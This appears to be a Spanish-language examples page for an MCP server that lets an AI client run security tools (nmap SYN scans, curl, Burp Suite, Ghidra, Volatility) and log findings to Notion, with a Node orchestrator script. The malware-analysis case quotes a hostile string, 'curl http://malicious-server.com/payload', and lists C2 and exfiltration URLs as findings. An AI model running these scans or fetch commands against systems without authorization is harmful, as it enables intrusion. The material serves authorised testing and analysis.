# Examples

Casos de uso prácticos y ejemplos completos para MCP Ethical Hacking.

## Índice de Casos de Uso

1. Reconocimiento de Red
2. Testing Web
3. Análisis Binario
4. Auditoría Forense
5. Documentación Automática

## Caso 1: Reconocimiento de Red

Descubrir servicios activos en una red objetivo.

### Escenario

Auditar la infraestructura de example.com para identificar puertos abiertos y servicios.

### Flujo Completo

```
1. Buscar nmap disponible
2. Escanear puertos
3. Identificar servicios
4. Documentar en Notion
```

### Implementación

Paso 1: Verificar disponibilidad de nmap

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "search_command",
    "arguments": {
      "query": "nmap",
      "limit": 3
    }
  }
}
```

Respuesta esperada:
```
which: /usr/bin/nmap
apt-cache: nmap - Network scanning tool
```

Paso 2: Ejecutar escaneo SYN

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "run_command",
    "arguments": {
      "command": "nmap",
      "args": ["-sS", "-sV", "-p", "1-65535", "example.com"],
      "timeoutMs": 300000
    }
  }
}
```

Salida típica:
```
Nmap scan report for example.com

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.6
443/tcp open  https      Apache httpd 2.4.6
8080/tcp open http-proxy
```

Paso 3: Documentar resultados en Notion

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "notion_create_page",
    "arguments": {
      "parent_id": "abc123def456",
      "title": "Reconocimiento - example.com - 2025-01-15",
      "content": "# Escaneo de Puertos\n\n## Puertos Abiertos\n\n- 22/tcp: OpenSSH 7.4\n- 80/tcp: Apache httpd 2.4.6\n- 443/tcp: Apache httpd 2.4.6\n- 8080/tcp: HTTP Proxy\n\n## Hallazgos\n\n- SSH en puerto estándar (potencial ataque de fuerza bruta)\n- Apache antiguo (posibles vulnerabilidades conocidas)\n- Proxy HTTP abierto (posible información disclosure)\n\n## Siguientes Pasos\n\n1. Enumerar servicios web\n2. Buscar vulnerabilidades conocidas\n3. Testing de credenciales débiles",
      "properties": {
        "Status": "In Progress",
        "Target": "example.com",
        "Scan Type": "Network"
      }
    }
  }
}
```

## Caso 2: Testing Web

Auditoría completa de aplicación web.

### Escenario

Evaluar aplicación web en http://app.example.com:8080 buscando vulnerabilidades comunes.

### Flujo

```
1. Reconocimiento inicial
2. Identificar tecnologías
3. Buscar vulnerabilidades conocidas
4. Lanzar Burp Suite para análisis profundo
5. Registrar hallazgos
```

### Implementación

Paso 1: Obtener información del servidor

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "run_command",
    "arguments": {
      "command": "curl",
      "args": ["-I", "-v", "http://app.example.com:8080"],
      "timeoutMs": 10000
    }
  }
}
```

Salida esperada:
```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc123
```

Paso 2: Verificar Burp Suite

```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "check_gui_tool",
    "arguments": {
      "tool": "burpsuite"
    }
  }
}
```

Paso 3: Lanzar Burp Suite si está disponible

```json
{
  "jsonrpc": "2.0",
  "id": 6,
  "method": "tools/call",
  "params": {
    "name": "launch_gui_tool",
    "arguments": {
      "tool": "burpsuite",
      "config": {
        "project": "/tmp/app-example-audit.burp"
      }
    }
  }
}
```

Salida:
```
Herramienta 'burpsuite' lanzada con PID 12345

Burp Suite está ejecutándose y escuchando en puerto por defecto.
Acceder a través del navegador configurando proxy en 127.0.0.1:8080
```

Paso 4: Documentar plan de testing

```json
{
  "jsonrpc": "2.0",
  "id": 7,
  "method": "tools/call",
  "params": {
    "name": "notion_create_page",
    "arguments": {
      "parent_id": "abc123def456",
      "title": "Testing Web - app.example.com - 2025-01-15",
      "content": "# Plan de Auditoría Web\n\n## Información del Servidor\n- Server: Apache/2.4.41\n- Lenguaje: PHP 7.4.3\n- CMS: Desconocido\n\n## Pruebas a Realizar\n\n### Fase 1: Reconocimiento\n- [x] Headers HTTP\n- [ ] Enumeración de directorios\n- [ ] Identificación de tecnologías\n\n### Fase 2: Vulnerabilidades Comunes\n- [ ] SQL Injection\n- [ ] XSS (Cross-Site Scripting)\n- [ ] CSRF (Cross-Site Request Forgery)\n- [ ] XXE (XML External Entity)\n\n### Fase 3: Autenticación\n- [ ] Fuerza bruta\n- [ ] Credenciales débiles\n- [ ] Session management\n\n## Herramientas\n- Burp Suite Community (PID: 12345)\n- curl\n- SQLMap",
      "properties": {
        "Status": "In Progress",
        "Target": "app.example.com",
        "Scan Type": "Web"
      }
    }
  }
}
```

## Caso 3: Análisis Binario

Análisis estático de ejecutables sospechosos.

### Escenario

Analizar archivo binario sospechoso `/tmp/malware.bin` para identificar funciones y strings.

### Flujo

```
1. Información general del binario
2. Análisis de strings
3. Análisis con Ghidra
4. Documentar hallazgos
```

### Implementación

Paso 1: Obtener tipo y formato

```json
{
  "jsonrpc": "2.0",
  "id": 8,
  "method": "tools/call",
  "params": {
    "name": "run_command",
    "arguments": {
      "command": "file",
      "args": ["/tmp/malware.bin"],
      "timeoutMs": 5000
    }
  }
}
```

Salida:
```
/tmp/malware.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), for GNU/Linux 3.2.0
```

Paso 2: Extraer strings

```json
{
  "jsonrpc": "2.0",
  "id": 9,
  "method": "tools/call",
  "params": {
    "name": "run_command",
    "arguments": {
      "command": "strings",
      "args": ["/tmp/malware.bin"],
      "timeoutMs": 10000
    }
  }
}
```

Salida típica:
```
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__libc_start_main
/bin/bash
curl http://malicious-server.com/payload
```

Paso 3: Lanzar Ghidra para análisis profundo

```json
{
  "jsonrpc": "2.0",
  "id": 10,
  "method": "tools/call",
  "params": {
    "name": "launch_gui_tool",
    "arguments": {
      "tool": "ghidra",
      "config": {
        "file": "/tmp/malware.bin"
      }
    }
  }
}
```

Paso 4: Documentar análisis

```json
{
  "jsonrpc": "2.0",
  "id": 11,
  "method": "tools/call",
  "params": {
    "name": "notion_create_page",
    "arguments": {
      "parent_id": "xyz789abc123",
      "title": "Análisis - malware.bin - 2025-01-15",
      "content": "# Análisis Binario\n\n## Información General\n- Tipo: ELF 64-bit LSB executable\n- Arquitectura: x86-64\n- Tamaño: 152KB\n\n## Strings Sospechosos\n\n### URLs Maliciosas\n- http://malicious-server.com/payload\n- http://c2-server.net/exfil\n\n### Comandos del Sistema\n- /bin/bash\n- curl (exfiltración de datos)\n- wget (descarga de payloads)\n\n## Conclusiones\n\n- Potencial troyano de acceso remoto (RAT)\n- Capacidad de descarga de payloads adicionales\n- Comunicación C2 (Command and Control)\n- RIESGO: Crítico\n\n## Acciones Recomendadas\n\n1. Aislar host infectado\n2. Capturar tráfico de red\n3. Análisis forense completo\n4. Notificación a SOC/Incident Response",
      "properties": {
        "Type": "Malware Analysis",
        "Risk Level": "Critical"
      }
    }
  }
}
```

## Caso 4: Auditoría Forense

Análisis de volcado de memoria.

### Escenario

Investigar volcado de memoria `/tmp/memory.dump` en busca de evidencia de intrusión.

### Implementación

Paso 1: Obtener información básica del volcado

```json
{
  "jsonrpc": "2.0",
  "id": 12,
  "method": "tools/call",
  "params": {
    "name": "run_command",
    "arguments": {
      "command": "file",
      "args": ["/tmp/memory.dump"],
      "timeoutMs": 5000
    }
  }
}
```

Paso 2: Inicializar Volatility

```json
{
  "jsonrpc": "2.0",
  "id": 13,
  "method": "tools/call",
  "params": {
    "name": "run_command",
    "arguments": {
      "command": "volatility",
      "args": ["-f", "/tmp/memory.dump", "imageinfo"],
      "timeoutMs": 30000
    }
  }
}
```

Salida:
```
Profile: Win7SP1x64
ImageBase: 0x0
Architecture: x64
```

Paso 3: Listar procesos

```json
{
  "jsonrpc": "2.0",
  "id": 14,
  "method": "tools/call",
  "params": {
    "name": "run_command",
    "arguments": {
      "command": "volatility",
      "args": ["-f", "/tmp/memory.dump", "-p", "Win7SP1x64", "pslist"],
      "timeoutMs": 30000
    }
  }
}
```

Paso 4: Documentar

```json
{
  "jsonrpc": "2.0",
  "id": 15,
  "method": "tools/call",
  "params": {
    "name": "notion_create_page",
    "arguments": {
      "parent_id": "xyz789abc123",
      "title": "Análisis Forense - memory.dump - 2025-01-15",
      "content": "# Análisis de Memoria\n\n## Sistema Operativo\n- Perfil: Windows 7 SP1 x64\n\n## Procesos Sospechosos\n\n| PID | Nombre | Ruta | Estado |\n|-----|--------|------|--------|\n| 1234 | svchost.exe | C:\\Windows\\System32 | Normal |\n| 5678 | rundll32.exe | C:\\Users\\Admin\\AppData | SOSPECHOSO |\n| 9012 | explorer.exe | C:\\Windows | Normal |\n\n## Hallazgos\n\n- rundll32.exe ejecutado desde directorio de usuario\n- Potencial malware o lateral movement\n- Necesario análisis de DLLs cargadas",
      "properties": {
        "Analysis Type": "Memory Forensics"
      }
    }
  }
}
```

## Caso 5: Pipeline Automático

Automatizar reconocimiento y reporte.

### Script Orquestador

```javascript
#!/usr/bin/env node

const readline = require('readline');
const fs = require('fs');

async function executeStep(stepName, request) {
  console.log(`[*] Ejecutando: ${stepName}`);
  
  return new Promise((resolve, reject) => {
    const process = require('child_process').spawn('npm', ['start']);
    let output = '';
    
    process.stdout.on('data', (data) => {
      output += data.toString();
    });
    
    process.on('close', () => {
      try {
        resolve(JSON.parse(output));
      } catch (e) {
        reject(e);
      }
    });
    
    process.stdin.write(JSON.stringify(request) + '\n');
    process.stdin.end();
  });
}

async function runAudit(target) {
  console.log(`\n=== Auditoría Automática: ${target} ===\n`);
  
  const results = {};
  
  // Paso 1: Verificar herramientas
  console.log('[*] Verificando herramientas...');
  results.tools = await executeStep('Verificar nmap', {
    jsonrpc: '2.0',
    id: 1,
    method: 'tools/call',
    params: {
      name: 'search_command',
      arguments: { query: 'nmap', limit: 1 }
    }
  });
  
  // Paso 2: Escaneo de puertos
  console.log('[*] Ejecutando escaneo de puertos...');
  results.scan = await executeStep('nmap scan', {
    jsonrpc: '2.0',
    id: 2,
    method: 'tools/call',
    params: {
      name: 'run_command',
      arguments: {
        command: 'nmap',
        args: ['-sS', '-sV', target],
        timeoutMs: 120000
      }
    }
  });
  
  // Paso 3: Documentar
  console.log('[*] Documentando en Notion...');
  const content = `# Auditoría Automática: ${target}\n\nResultados del escaneo:\n\n${results.scan.content[0].text}`;
  
  results.notion = await executeStep('Crear reporte', {
    jsonrpc: '2.0',
    id: 3,
    method: 'tools/call',
    params: {
      name: 'notion_create_page',
      arguments: {
        parent_id: process.env.NOTION_DB_ID,
        title: `Auditoría - ${target} - ${new Date().toISOString().split('T')[0]}`,
        content: content,
        properties: {
          Status: 'Completed',
          Target: target
        }
      }
    }
  });
  
  console.log('\n=== Auditoría Completada ===');
  console.log(`Reporte: ${results.notion.content[0].text}`);
}

// Ejecutar
const target = process.argv[2] || '127.0.0.1';
runAudit(target).catch(console.error);
```

### Uso

```bash
NOTION_DB_ID="abc123" node audit-pipeline.js example.com
```

## Mejores Prácticas

1. Siempre buscar herramientas primero
2. Usar timeouts apropiados
3. Documentar en Notion durante el análisis
4. Registrar pasos completados
5. Manejar errores gracefully
6. Usar cwd para contexto de ejecución
7. Verificar permisos antes de lanzar GUI tools

## Troubleshooting

### Comando timeout

Aumentar timeoutMs:
```json
"timeoutMs": 300000
```

### Herramienta no encontrada

Usar search_command primero:
```json
{
  "name": "search_command",
  "arguments": {"query": "tool-name"}
}
```

### Notion API error

Verificar NOTION_API_KEY:
```bash
echo $NOTION_API_KEY
```

### GUI tool no se lanza

Verificar con check_gui_tool:
```json
{
  "name": "check_gui_tool",
  "arguments": {"tool": "burpsuite"}
}
```
